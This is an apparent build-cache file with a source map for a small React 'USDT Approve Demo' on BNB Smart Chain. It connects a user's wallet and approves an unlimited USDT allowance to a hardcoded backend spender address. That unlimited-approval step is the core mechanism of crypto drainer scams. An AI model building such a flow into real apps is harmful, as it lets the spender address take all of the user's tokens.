{"ast":null,"code":"var _jsxFileName = \"/Users/aryan/Documents/frontend/src/App.js\",\n  _s = $RefreshSig$();\nimport React, { useState } from \"react\";\nimport { ethers } from \"ethers\";\nimport { jsxDEV as _jsxDEV, Fragment as _Fragment } from \"react/jsx-dev-runtime\";\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\"; // BSC USDT token\nconst BACKEND_SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\"; // <-- REPLACE THIS!\n\nconst USDT_ABI = [\"function approve(address spender, uint256 amount) external returns (bool)\"];\nfunction App() {\n  _s();\n  const [provider, setProvider] = useState(null);\n  const [signer, setSigner] = useState(null);\n  const [account, setAccount] = useState(null);\n  const [txHash, setTxHash] = useState(null);\n  const [loading, setLoading] = useState(false);\n\n  // Connect wallet function\n  async function connectWallet() {\n    if (!window.ethereum) {\n      alert(\"Please install MetaMask or Trust Wallet\");\n      return;\n    }\n    try {\n      await window.ethereum.request({\n        method: \"eth_requestAccounts\"\n      });\n      const _provider = new ethers.BrowserProvider(window.ethereum);\n      const _signer = await _provider.getSigner();\n      const address = await _signer.getAddress();\n      setProvider(_provider);\n      setSigner(_signer);\n      setAccount(address);\n      setTxHash(null);\n    } catch (error) {\n      console.error(\"Connection error:\", error);\n      alert(\"Failed to connect wallet\");\n    }\n  }\n\n  // Approve max USDT function\n  async function approveMax() {\n    if (!signer) {\n      alert(\"Please connect your wallet first\");\n      return;\n    }\n    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);\n    const maxAmount = ethers.MaxUint256;\n    try {\n      setLoading(true);\n      const tx = await usdtContract.approve(BACKEND_SPENDER_ADDRESS, maxAmount);\n      setTxHash(tx.hash);\n      await tx.wait();\n      alert(\"Approval confirmed!\");\n    } catch (error) {\n      console.error(\"Approval error:\", error);\n      alert(\"Approval failed: \" + error.message);\n    } finally {\n      setLoading(false);\n    }\n  }\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    style: {\n      maxWidth: 400,\n      margin: \"auto\",\n      padding: 20,\n      fontFamily: \"Arial\"\n    },\n    children: [/*#__PURE__*/_jsxDEV(\"h2\", {\n      children: \"USDT Approve Demo\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 66,\n      columnNumber: 7\n    }, this), !account ? /*#__PURE__*/_jsxDEV(\"button\", {\n      onClick: connectWallet,\n      style: {\n        padding: \"10px 20px\",\n        fontSize: 16\n      },\n      children: \"Connect Wallet\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 68,\n      columnNumber: 9\n    }, this) : /*#__PURE__*/_jsxDEV(_Fragment, {\n      children: [/*#__PURE__*/_jsxDEV(\"p\", {\n        children: [\"Connected: \", /*#__PURE__*/_jsxDEV(\"b\", {\n          children: account\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 73,\n          columnNumber: 25\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 73,\n        columnNumber: 11\n      }, this), /*#__PURE__*/_jsxDEV(\"button\", {\n        onClick: approveMax,\n        disabled: loading,\n        style: {\n          padding: \"10px 20px\",\n          fontSize: 16\n        },\n        children: loading ? \"Approving...\" : \"Approve Max USDT\"\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 74,\n        columnNumber: 11\n      }, this), txHash && /*#__PURE__*/_jsxDEV(\"p\", {\n        children: [\"Approval Tx Hash:\", \" \", /*#__PURE__*/_jsxDEV(\"a\", {\n          href: `https://bscscan.com/tx/${txHash}`,\n          target: \"_blank\",\n          rel: \"noreferrer\",\n          children: [txHash.slice(0, 10), \"...\", txHash.slice(-8)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 84,\n          columnNumber: 15\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 82,\n        columnNumber: 13\n      }, this)]\n    }, void 0, true)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 65,\n    columnNumber: 5\n  }, this);\n}\n_s(App, \"+OKZixkp0/JNHjfez8rixC+Thxs=\");\n_c = App;\nexport default App;\nvar _c;\n$RefreshReg$(_c, \"App\");","map":{"version":3,"names":["React","useState","ethers","jsxDEV","_jsxDEV","Fragment","_Fragment","USDT_ADDRESS","BACKEND_SPENDER_ADDRESS","USDT_ABI","App","_s","provider","setProvider","signer","setSigner","account","setAccount","txHash","setTxHash","loading","setLoading","connectWallet","window","ethereum","alert","request","method","_provider","BrowserProvider","_signer","getSigner","address","getAddress","error","console","approveMax","usdtContract","Contract","maxAmount","MaxUint256","tx","approve","hash","wait","message","style","maxWidth","margin","padding","fontFamily","children","fileName","_jsxFileName","lineNumber","columnNumber","onClick","fontSize","disabled","href","target","rel","slice","_c","$RefreshReg$"],"sources":["/Users/aryan/Documents/frontend/src/App.js"],"sourcesContent":["import React, { useState } from \"react\";\nimport { ethers } from \"ethers\";\n\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\"; // BSC USDT token\nconst BACKEND_SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\"; // <-- REPLACE THIS!\n\nconst USDT_ABI = [\n  \"function approve(address spender, uint256 amount) external returns (bool)\",\n];\n\nfunction App() {\n  const [provider, setProvider] = useState(null);\n  const [signer, setSigner] = useState(null);\n  const [account, setAccount] = useState(null);\n  const [txHash, setTxHash] = useState(null);\n  const [loading, setLoading] = useState(false);\n\n  // Connect wallet function\n  async function connectWallet() {\n    if (!window.ethereum) {\n      alert(\"Please install MetaMask or Trust Wallet\");\n      return;\n    }\n    try {\n      await window.ethereum.request({ method: \"eth_requestAccounts\" });\n      const _provider = new ethers.BrowserProvider(window.ethereum);\n      const _signer = await _provider.getSigner();\n      const address = await _signer.getAddress();\n\n      setProvider(_provider);\n      setSigner(_signer);\n      setAccount(address);\n      setTxHash(null);\n    } catch (error) {\n      console.error(\"Connection error:\", error);\n      alert(\"Failed to connect wallet\");\n    }\n  }\n\n  // Approve max USDT function\n  async function approveMax() {\n    if (!signer) {\n      alert(\"Please connect your wallet first\");\n      return;\n    }\n\n    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);\n    const maxAmount = ethers.MaxUint256;\n\n    try {\n      setLoading(true);\n      const tx = await usdtContract.approve(BACKEND_SPENDER_ADDRESS, maxAmount);\n      setTxHash(tx.hash);\n      await tx.wait();\n      alert(\"Approval confirmed!\");\n    } catch (error) {\n      console.error(\"Approval error:\", error);\n      alert(\"Approval failed: \" + error.message);\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  return (\n    <div style={{ maxWidth: 400, margin: \"auto\", padding: 20, fontFamily: \"Arial\" }}>\n      <h2>USDT Approve Demo</h2>\n      {!account ? (\n        <button onClick={connectWallet} style={{ padding: \"10px 20px\", fontSize: 16 }}>\n          Connect Wallet\n        </button>\n      ) : (\n        <>\n          <p>Connected: <b>{account}</b></p>\n          <button\n            onClick={approveMax}\n            disabled={loading}\n            style={{ padding: \"10px 20px\", fontSize: 16 }}\n          >\n            {loading ? \"Approving...\" : \"Approve Max USDT\"}\n          </button>\n          {txHash && (\n            <p>\n              Approval Tx Hash:{\" \"}\n              <a\n                href={`https://bscscan.com/tx/${txHash}`}\n                target=\"_blank\"\n                rel=\"noreferrer\"\n              >\n                {txHash.slice(0, 10)}...{txHash.slice(-8)}\n              </a>\n            </p>\n          )}\n        </>\n      )}\n    </div>\n  );\n}\n\nexport default App;\n"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}